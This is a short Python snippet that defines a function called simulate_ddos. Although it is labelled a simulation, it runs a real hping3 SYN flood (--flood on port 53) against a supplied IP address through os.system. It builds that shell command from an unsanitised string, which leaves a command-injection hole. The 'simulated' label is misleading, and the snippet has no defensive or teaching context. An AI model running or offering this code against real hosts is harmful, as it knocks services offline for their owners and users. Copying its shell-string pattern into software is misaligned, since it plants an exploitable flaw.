import os

def simulate_ddos(target_ip: str):
    print(f"[INFO] Starting simulated DDoS attack on {target_ip}")
    os.system(f"hping3 -S -p 53 --flood {target_ip}")
